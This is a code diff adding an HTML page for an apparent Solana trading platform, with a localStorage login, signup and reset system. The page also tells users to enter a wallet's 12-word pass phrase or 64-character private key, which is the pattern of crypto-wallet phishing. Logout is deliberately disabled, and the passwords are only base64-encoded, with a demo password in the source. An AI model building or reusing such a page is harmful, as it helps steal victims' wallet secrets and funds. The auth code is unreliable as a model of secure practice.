+                            <p style="color: rgba(255, 255, 255, 0.9); font-size: 14px; margin-bottom: 12px;">
+                                <i class="fas fa-info-circle" style="color: var(--warning); margin-right: 8px;"></i>
+                                <strong>Security Requirements:</strong>
+                            </p>
+                            <ul
+                                style="color: rgba(255, 255, 255, 0.7); font-size: 13px; padding-left: 24px; line-height: 1.8;">
+                                <li>Pass phrase must be exactly 12 words separated by spaces</li>
+                                <li>Private key must be exactly 64 hexadecimal characters</li>
+                                <li>No extra spaces, commas, or special characters allowed</li>
+                                <li>All words must be spelled correctly (pass phrase)</li>
+                                <li>Private key may start with 0x prefix (optional)</li>
+                            </ul>
+                        </div>
+
+                        <div
+                            style="display: flex; gap: 16px; justify-content: center; margin-top: 40px; flex-wrap: wrap;">
+                            <button class="btn btn-secondary touch-friendly" id="retryBtn" style="min-width: 160px;">
+                                <i class="fas fa-redo"></i> Try Again
+                            </button>
+                            <button class="btn btn-primary touch-friendly" id="tryDifferentBtn"
+                                style="min-width: 160px;">
+                                <i class="fas fa-sync-alt"></i> Different Method
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Receipt Modal -->
+        <div id="receiptModal" class="modal">
+            <div class="modal-content receipt-modal">
+                <button class="close-modal touch-friendly" onclick="closeReceiptModal()">
+                    <i class="fas fa-times"></i>
+                </button>
+
+                <div class="receipt-container" id="receiptContent">
+                    <div class="receipt-loading">
+                        <div class="receipt-loading-spinner"></div>
+                        <h3 style="color: white; margin-bottom: 15px;">Generating Receipt...</h3>
+                        <p style="color: rgba(255, 255, 255, 0.7);">Processing transaction details and Solana blockchain
+                            confirmation</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==============================================
+        // COMPLETE AUTHENTICATION SYSTEM
+        // ==============================================
+
+        class SecureAuthSystem {
+            constructor() {
+                this.STORAGE_KEYS = {
+                    USERS: 'solana_secure_users_v2',
+                    SESSION: 'solana_active_session_v2',
+                    REMEMBER_ME: 'solana_remember_me_data',
+                    PASSWORD_RESETS: 'solana_password_resets'
+                };
+
+                this.demoUsers = [{
+                    id: this.generateId(),
+                    name: "Kelly West",
+                    email: "west@example.com",
+                    password: this.hashPassword("West123!"),
+                    createdAt: new Date().toISOString(),
+                    verified: true,
+                    resetToken: null,
+                    resetExpiry: null
+                }];
+
+                this.init();
+            }
+
+            init() {
+                this.ensureBlankInputs();
+                this.initStorage();
+                this.setupEventListeners();
+                this.checkAuthStatus();
+            }
+
+            generateId() {
+                return Date.now().toString(36) + Math.random().toString(36).substr(2);
+            }
+
+            hashPassword(password) {
+                // Simple hash for demo - in production use bcrypt or Argon2
+                return btoa(password + '_solana_salt_' + password.length);
+            }
+
+            ensureBlankInputs() {
+                // Clear all form inputs on page load
+                setTimeout(() => {
+                    const inputs = document.querySelectorAll('#authContainer input');
+                    inputs.forEach(input => {
+                        input.value = '';
+                        input.setAttribute('data-user-filled', 'false');
+                    });
+
+                    // Uncheck remember me
+                    const rememberMe = document.getElementById('rememberMe');
+                    if (rememberMe) rememberMe.checked = false;
+
+                    // Uncheck terms
+                    const termsAgree = document.getElementById('termsAgree');
+                    if (termsAgree) termsAgree.checked = false;
+
+                    // Clear validation messages
+                    document.querySelectorAll('.validation-message').forEach(msg => {
+                        msg.style.display = 'none';
+                    });
+
+                    // Clear alerts
+                    this.clearAlerts();
+                }, 100);
+            }
+
+            initStorage() {
+                // Initialize users storage if empty
+                if (!localStorage.getItem(this.STORAGE_KEYS.USERS)) {
+                    localStorage.setItem(this.STORAGE_KEYS.USERS, JSON.stringify(this.demoUsers));
+                }
+
+                // Initialize password resets storage
+                if (!localStorage.getItem(this.STORAGE_KEYS.PASSWORD_RESETS)) {
+                    localStorage.setItem(this.STORAGE_KEYS.PASSWORD_RESETS, JSON.stringify([]));
+                }
+            }
+
+            setupEventListeners() {
+                // Form submissions
+                const loginForm = document.getElementById('loginForm');
+                const signupForm = document.getElementById('signupForm');
+                const forgotForm = document.getElementById('forgotPasswordForm');
+
+                if (loginForm) {
+                    loginForm.addEventListener('submit', (e) => this.handleLogin(e));
+                }
+
+                if (signupForm) {
+                    signupForm.addEventListener('submit', (e) => this.handleSignup(e));
+                }
+
+                if (forgotForm) {
+                    forgotForm.addEventListener('submit', (e) => this.handleForgotPassword(e));
+                }
+
+                // Real-time validation
+                this.setupValidationListeners();
+
+                // Load remembered email if applicable
+                this.loadRememberedEmail();
+            }
+
+            setupValidationListeners() {
+                // Email validation
+                ['loginEmail', 'signupEmail', 'forgotEmail'].forEach(id => {
+                    const input = document.getElementById(id);
+                    if (input) {
+                        input.addEventListener('blur', () => this.validateEmail(input.value, id));
+                        input.addEventListener('input', () => {
+                            if (input.value) this.validateEmail(input.value, id);
+                        });
+                    }
+                });
+
+                // Password validation
+                ['loginPassword', 'signupPassword'].forEach(id => {
+                    const input = document.getElementById(id);
+                    if (input) {
+                        input.addEventListener('input', () => {
+                            this.validatePassword(input.value, id);
+                        });
+                    }
+                });
+
+                // Confirm password validation
+                const confirmInput = document.getElementById('signupConfirmPassword');
+                if (confirmInput) {
+                    confirmInput.addEventListener('input', () => {
+                        const password = document.getElementById('signupPassword').value;
+                        this.validateConfirmPassword(password, confirmInput.value);
+                    });
+                }
+            }
+
+            validateEmail(email, fieldId) {
+                const errorId = `${fieldId}Error`;
+                const errorElement = document.getElementById(errorId);
+
+                if (!email) {
+                    this.showValidation(errorElement, 'Email is required', false);
+                    return false;
+                }
+
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    this.showValidation(errorElement, 'Please enter a valid email address', false);
+                    return false;
+                }
+
+                this.showValidation(errorElement, 'Valid email address', true);
+                return true;
+            }
+
+            validatePassword(password, fieldId) {
+                const errorId = `${fieldId}Error`;
+                const errorElement = document.getElementById(errorId);
+
+                if (!password) {
+                    this.showValidation(errorElement, 'Password is required', false);
+                    return false;
+                }
+
+                if (password.length < 8) {
+                    this.showValidation(errorElement, 'Password must be at least 8 characters', false);
+                    return false;
+                }
+
+                this.showValidation(errorElement, 'Good password', true);
+                return true;
+            }
+
+            validateConfirmPassword(password, confirmPassword) {
+                const errorElement = document.getElementById('signupConfirmError');
+
+                if (!confirmPassword) {
+                    this.showValidation(errorElement, 'Please confirm your password', false);
+                    return false;
+                }
+
+                if (password !== confirmPassword) {
+                    this.showValidation(errorElement, 'Passwords do not match', false);
+                    return false;
+                }
+
+                this.showValidation(errorElement, 'Passwords match', true);
+                return true;
+            }
+
+            showValidation(element, message, isValid) {
+                if (!element) return;
+
+                element.innerHTML = `
+            <i class="fas fa-${isValid ? 'check-circle' : 'exclamation-circle'}"></i>
+            ${message}
+        `;
+                element.className = `validation-message show ${isValid ? 'valid' : ''}`;
+            }
+
+            loadRememberedEmail() {
+                const rememberMeData = JSON.parse(
+                    localStorage.getItem(this.STORAGE_KEYS.REMEMBER_ME) || '{}'
+                );
+
+                if (rememberMeData.email) {
+                    setTimeout(() => {
+                        const emailInput = document.getElementById('loginEmail');
+                        const rememberMeCheckbox = document.getElementById('rememberMe');
+
+                        if (emailInput) emailInput.value = rememberMeData.email;
+                        if (rememberMeCheckbox) rememberMeCheckbox.checked = true;
+
+                        if (emailInput && emailInput.value) {
+                            emailInput.setAttribute('data-user-filled', 'true');
+                        }
+                    }, 200);
+                }
+            }
+
+            saveRememberedEmail(email) {
+                const rememberMeCheckbox = document.getElementById('rememberMe');
+                if (rememberMeCheckbox && rememberMeCheckbox.checked) {
+                    const rememberMeData = {
+                        email: email,
+                        lastLogin: new Date().toISOString()
+                    };
+                    localStorage.setItem(this.STORAGE_KEYS.REMEMBER_ME, JSON.stringify(rememberMeData));
+                } else {
+                    localStorage.removeItem(this.STORAGE_KEYS.REMEMBER_ME);
+                }
+            }
+
+            async handleLogin(e) {
+                e.preventDefault();
+
+                const email = document.getElementById('loginEmail').value.trim().toLowerCase();
+                const password = document.getElementById('loginPassword').value;
+                const loginButton = document.getElementById('loginButton');
+
+                // Clear previous alerts
+                this.clearAlerts();
+
+                // Validate inputs
+                if (!this.validateEmail(email, 'loginEmail') || !password) {
+                    this.showAlert('login', 'Please enter valid credentials', 'error');
+                    return;
+                }
+
+                // Show loading
+                if (loginButton) {
+                    loginButton.disabled = true;
+                    loginButton.innerHTML = '<span class="loading-spinner"></span> Authenticating...';
+                }
+
+                try {
+                    // Simulate API delay
+                    await new Promise(resolve => setTimeout(resolve, 800));
+
+                    // Get all users
+                    const users = JSON.parse(localStorage.getItem(this.STORAGE_KEYS.USERS) || '[]');
+                    const user = users.find(u => u.email.toLowerCase() === email.toLowerCase());
+
+                    if (!user) {
+                        throw new Error('Invalid email or password');
+                    }
+
+                    if (!this.verifyPassword(password, user.password)) {
+                        throw new Error('Invalid email or password');
+                    }
+
+                    // Save remembered email
+                    this.saveRememberedEmail(email);
+
+                    // Create session
+                    const session = {
+                        userId: user.id,
+                        name: user.name,
+                        email: user.email,
+                        createdAt: user.createdAt,
+                        loggedInAt: new Date().toISOString()
+                    };
+
+                    sessionStorage.setItem(this.STORAGE_KEYS.SESSION, JSON.stringify(session));
+
+                    // Show success
+                    this.showAlert('login', 'Login successful! Redirecting...', 'success');
+
+                    // Redirect to main app
+                    setTimeout(() => {
+                        this.redirectToApp(session);
+                    }, 1000);
+
+                } catch (error) {
+                    console.error('Login error:', error);
+                    this.showAlert('login', error.message || 'Invalid email or password', 'error');
+                } finally {
+                    // Reset button
+                    if (loginButton) {
+                        loginButton.disabled = false;
+                        loginButton.innerHTML = '<span>Sign In</span>';
+                    }
+                }
+            }
+
+            async handleSignup(e) {
+                e.preventDefault();
+
+                const name = document.getElementById('signupName').value.trim();
+                const email = document.getElementById('signupEmail').value.trim().toLowerCase();
+                const password = document.getElementById('signupPassword').value;
+                const confirmPassword = document.getElementById('signupConfirmPassword').value;
+                const termsAgree = document.getElementById('termsAgree').checked;
+                const signupButton = document.getElementById('signupButton');
+
+                // Clear previous alerts
+                this.clearAlerts();
+
+                // Validate inputs
+                if (!name) {
+                    this.showValidation(document.getElementById('signupNameError'), 'Name is required', false);
+                    this.showAlert('signup', 'Please fill in all required fields', 'error');
+                    return;
+                }
+
+                if (!this.validateEmail(email, 'signupEmail') ||
+                    !this.validatePassword(password, 'signupPassword') ||
+                    !this.validateConfirmPassword(password, confirmPassword)) {
+                    this.showAlert('signup', 'Please fix validation errors', 'error');
+                    return;
+                }
+
+                if (!termsAgree) {
+                    this.showValidation(document.getElementById('termsError'), 'You must agree to the terms', false);
+                    this.showAlert('signup', 'Please agree to the terms and conditions', 'error');
+                    return;
+                }
+
+                // Show loading
+                if (signupButton) {
+                    signupButton.disabled = true;
+                    signupButton.innerHTML = '<span class="loading-spinner"></span> Creating account...';
+                }
+
+                try {
+                    // Simulate API delay
+                    await new Promise(resolve => setTimeout(resolve, 800));
+
+                    // Get all users
+                    const users = JSON.parse(localStorage.getItem(this.STORAGE_KEYS.USERS) || '[]');
+
+                    // Check if user already exists
+                    const existingUser = users.find(u => u.email.toLowerCase() === email.toLowerCase());
+                    if (existingUser) {
+                        throw new Error('An account with this email already exists');
+                    }
+
+                    // Create new user
+                    const newUser = {
+                        id: this.generateId(),
+                        name: name,
+                        email: email,
+                        password: this.hashPassword(password),
+                        createdAt: new Date().toISOString(),
+                        verified: true,
+                        resetToken: null,
+                        resetExpiry: null
+                    };
+
+                    // Save user
+                    users.push(newUser);
+                    localStorage.setItem(this.STORAGE_KEYS.USERS, JSON.stringify(users));
+
+                    // Save remembered email
+                    this.saveRememberedEmail(email);
+
+                    // Create session
+                    const session = {
+                        userId: newUser.id,
+                        name: newUser.name,
+                        email: newUser.email,
+                        createdAt: newUser.createdAt,
+                        loggedInAt: new Date().toISOString()
+                    };
+
+                    sessionStorage.setItem(this.STORAGE_KEYS.SESSION, JSON.stringify(session));
+
+                    // Show success
+                    this.showAlert('signup', 'Account created successfully! Redirecting...', 'success');
+
+                    // Redirect to main app
+                    setTimeout(() => {
+                        this.redirectToApp(session);
+                    }, 1000);
+
+                } catch (error) {
+                    console.error('Signup error:', error);
+                    this.showAlert('signup', error.message, 'error');
+                } finally {
+                    // Reset button
+                    if (signupButton) {
+                        signupButton.disabled = false;
+                        signupButton.innerHTML = '<span>Create Account</span>';
+                    }
+                }
+            }
+
+            async handleForgotPassword(e) {
+                e.preventDefault();
+
+                const email = document.getElementById('forgotEmail').value.trim().toLowerCase();
+                const forgotButton = document.getElementById('forgotButton');
+
+                // Clear previous alerts
+                this.clearAlerts();
+
+                // Validate email
+                if (!this.validateEmail(email, 'forgotEmail')) {
+                    this.showAlert('forgot', 'Please enter a valid email address', 'error');
+                    return;
+                }
+
+                // Show loading
+                if (forgotButton) {
+                    forgotButton.disabled = true;
+                    forgotButton.innerHTML = '<span class="loading-spinner"></span> Sending...';
+                }
+
+                try {
+                    // Simulate API delay
+                    await new Promise(resolve => setTimeout(resolve, 800));
+
+                    // Get all users
+                    const users = JSON.parse(localStorage.getItem(this.STORAGE_KEYS.USERS) || '[]');
+                    const user = users.find(u => u.email.toLowerCase() === email.toLowerCase());
+
+                    if (!user) {
+                        throw new Error('No account found with this email');
+                    }
+
+                    // Generate reset token (simulated)
+                    const resetToken = this.generateId();
+                    const resetExpiry = Date.now() + 3600000; // 1 hour from now
+
+                    // Update user with reset token
+                    user.resetToken = resetToken;
+                    user.resetExpiry = resetExpiry;
+
+                    // Save updated users
+                    localStorage.setItem(this.STORAGE_KEYS.USERS, JSON.stringify(users));
+
+                    // Show success message
+                    this.showAlert('forgot', 'Password reset link sent to your email. Please check your inbox.', 'success');
+
+                    // Simulate email sent
+                    console.log(`Password reset link for ${email}: /reset-password?token=${resetToken}`);
+
+                    // Auto-switch back to login after delay
+                    setTimeout(() => {
+                        this.showLogin();
+                        document.getElementById('loginEmail').value = email;
+                    }, 2000);
+
+                } catch (error) {
+                    console.error('Forgot password error:', error);
+                    this.showAlert('forgot', error.message, 'error');
+                } finally {
+                    // Reset button
+                    if (forgotButton) {
+                        forgotButton.disabled = false;
+                        forgotButton.innerHTML = '<span>Send Reset Link</span>';
+                    }
+                }
+            }
+
+            verifyPassword(inputPassword, storedHash) {
+                return this.hashPassword(inputPassword) === storedHash;
+            }
+
+            showAlert(formId, message, type = 'error') {
+                const alertDiv = document.getElementById(`${formId}Alert`);
+                if (!alertDiv) return;
+
+                const icons = {
+                    error: 'exclamation-circle',
+                    success: 'check-circle',
+                    warning: 'exclamation-triangle',
+                    info: 'info-circle'
+                };
+
+                alertDiv.className = `alert alert-${type}`;
+                alertDiv.innerHTML = `
+            <i class="fas fa-${icons[type] || 'info-circle'}"></i>
+            <span>${message}</span>
+        `;
+                alertDiv.style.display = 'flex';
+
+                if (type !== 'error') {
+                    setTimeout(() => {
+                        alertDiv.style.display = 'none';
+                    }, 5000);
+                }
+            }
+
+            clearAlerts() {
+                document.querySelectorAll('.alert').forEach(alert => {
+                    alert.style.display = 'none';
+                });
+            }
+
+            checkAuthStatus() {
+                const session = JSON.parse(sessionStorage.getItem(this.STORAGE_KEYS.SESSION) || 'null');
+
+                if (session) {
+                    this.redirectToApp(session);
+                    return true;
+                }
+                return false;
+            }
+
+            redirectToApp(session) {
+                const authContainer = document.getElementById('authContainer');
+                const mainApp = document.getElementById('mainApp');
+
+                if (authContainer) authContainer.style.display = 'none';
+                if (mainApp) {
+                    mainApp.classList.add('active');
+                    mainApp.style.display = 'block';
+                }
+
+                // Update user interface
+                this.updateUserUI(session);
+
+                console.log('User authenticated:', session.email);
+            }
+
+            updateUserUI(session) {
+                const userName = document.getElementById('userName');
+                const userEmail = document.getElementById('userEmail');
+                const userAvatar = document.getElementById('userAvatar');
+                const userProfile = document.getElementById('userProfile');
+
+                if (userName && session.name) {
+                    userName.textContent = session.name;
+                }
+                if (userEmail && session.email) {
+                    userEmail.textContent = session.email;
+                }
+                if (userAvatar && session.name) {
+                    const initials = session.name
+                        .split(' ')
+                        .map(n => n[0])
+                        .join('')
+                        .toUpperCase()
+                        .slice(0, 2);
+                    userAvatar.textContent = initials;
+                }
+                if (userProfile) {
+                    userProfile.style.display = 'flex';
+                }
+            }
+
+            // logout() {
+            //     console.log('Logging out user...');
+
+            //     // Clear all session data
+            //     sessionStorage.removeItem(this.STORAGE_KEYS.SESSION);
+
+            //     // Clear platform data
+            //     if (window.platform) {
+            //         if (window.platform.autoTradeInterval) {
+            //             clearInterval(window.platform.autoTradeInterval);
+            //         }
+            //         window.platform.isWalletConnected = false;
+            //         window.platform.hasPurchased = false;
+            //     }
+
+            //     // Hide main app, show auth
+            //     const mainApp = document.getElementById('mainApp');
+            //     const authContainer = document.getElementById('authContainer');
+
+            //     if (mainApp) {
+            //         mainApp.classList.remove('active');
+            //         mainApp.style.display = 'none';
+            //     }
+
+            //     if (authContainer) {
+            //         authContainer.style.display = 'flex';
+            //     }
+
+            //     // Reset to login form with blank inputs
+            //     this.showLogin();
+            //     this.ensureBlankInputs();
+
+            //     // Clear any navigation menu
+            //     const navMenu = document.getElementById('navMenu');
+            //     if (navMenu) navMenu.classList.remove('active');
+
+            //     console.log('Logout complete - user redirected to login');
+            // }
+            //     // Replace it with this empty method:
+            //     logout() {
+            //     console.log('Logout functionality has been disabled');
+            //     // Logout is intentionally disabled
+            //     return false;
+            // }   
+
+            showLogin() {
+                document.getElementById('signupForm').classList.remove('active');
+                document.getElementById('forgotPasswordForm').classList.remove('active');
+                document.getElementById('loginForm').classList.add('active');
+
+                document.getElementById('authTitle').textContent = 'Welcome Back';
+                document.getElementById('authSubtitle').textContent = 'Secure access to Solana Web3 platform.';
+
+                // Clear alerts
+                this.clearAlerts();
+            }
+
+            showSignup() {
+                document.getElementById('loginForm').classList.remove('active');
+                document.getElementById('forgotPasswordForm').classList.remove('active');
+                document.getElementById('signupForm').classList.add('active');
+
+                document.getElementById('authTitle').textContent = 'Create Account';
+                document.getElementById('authSubtitle').textContent = 'Create your account to access the platform.';
+
+                // Clear alerts
+                this.clearAlerts();
+            }
+
+            openForgotPassword() {
+                document.getElementById('loginForm').classList.remove('active');
+                document.getElementById('signupForm').classList.remove('active');
+                document.getElementById('forgotPasswordForm').classList.add('active');
+
+                document.getElementById('authTitle').textContent = 'Reset Password';
+                document.getElementById('authSubtitle').textContent = 'Enter your email to receive a reset link.';
+
+                // Clear alerts
+                this.clearAlerts();
+            }
+        }
+
+        // ==============================================
+        // GLOBAL FUNCTIONS
+        // ==============================================
+
+        // Initialize auth system
+        let authSystem = null;
+
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log('Initializing authentication system...');
+
+            // Initialize auth system
+            authSystem = new SecureAuthSystem();
+
+
+            // Call the setup function after authSystem is initialized
+            //setupBackToLoginLinks();
+
+            // Setup global functions
+            window.authSystem = authSystem;
+
+            // Setup global click handlers
+            document.querySelectorAll('[onclick*="showSignup"]').forEach(link => {
+                if (link.onclick) return;
+                link.onclick = function (e) {
+                    e.preventDefault();
+                    authSystem.showSignup();
+                };
+            });
+
+            document.querySelectorAll('[onclick*="showLogin"]').forEach(link => {
+                if (link.onclick) return;
+                link.onclick = function (e) {
+                    e.preventDefault();
+                    authSystem.showLogin();
+                };
+            });
+
+            document.querySelectorAll('[onclick*="openForgotPassword"]').forEach(link => {
+                if (link.onclick) return;
+                link.onclick = function (e) {
+                    e.preventDefault();
+                    authSystem.openForgotPassword();
+                };
+            });
+
+            // Setup logout button
+            const logoutBtn = document.querySelector('.logout-btn');
+            if (logoutBtn) {
+                logoutBtn.onclick = function (e) {
+                    e.preventDefault();
+                    authSystem.logout();
+                };
+            }
+
+            console.log('Authentication system ready');
+        });
+
+        // Global helper functions
+        window.togglePassword = function (inputId) {
+            const input = document.getElementById(inputId);
+            if (!input) return;
+
+            const toggle = event.currentTarget;
+            if (input.type === 'password') {
+                input.type = 'text';
+                toggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
+            } else {
+                input.type = 'password';
+                toggle.innerHTML = '<i class="fas fa-eye"></i>';
+            }
+        };
+
+        window.showSignup = function () {
+            if (authSystem) authSystem.showSignup();
+        };
+
+        window.showLogin = function () {
+            if (authSystem) authSystem.showLogin();
+        };
+
+        window.openForgotPassword = function () {
+            if (authSystem) authSystem.openForgotPassword();
+        };
+
+        // window.logout = function () {
+        //     if (authSystem) authSystem.logout();
+        // };
+        
+        window.logout = function () {
+        console.log('Logout is disabled');
+        return false;
+        };
+
+        // Fix for forgot password back link
+        document.addEventListener('DOMContentLoaded', function () {
+            // Override the back to login link in forgot password form
+            const forgotBackLink = document.querySelector('#forgotPasswordForm .auth-link');
+            if (forgotBackLink) {
+                forgotBackLink.onclick = function (e) {
+                    e.preventDefault();
+                    authSystem.showLogin();
+                    return false;
+                };
+            }
+        });
+        // Password Reset Flow (Additional Implementation)
+        /*
+        FORGOT PASSWORD SECURE FLOW:
+        1. User requests password reset → system validates email exists
+        2. Generate unique token with expiry (1 hour)
+        3. Store token in user record with expiry timestamp
+        4. Send email with reset link containing token
+        5. User clicks link → verify token and expiry
+        6. Show password reset form (only if token is valid)
+        7. User enters new password → validate and hash
+        8. Update user password, invalidate token
+        9. Send confirmation email
+        10. Redirect to login page
+        */
+    </script>
+
+    <script src="index.js" defer></script>
+
+</body>
+
+</html>
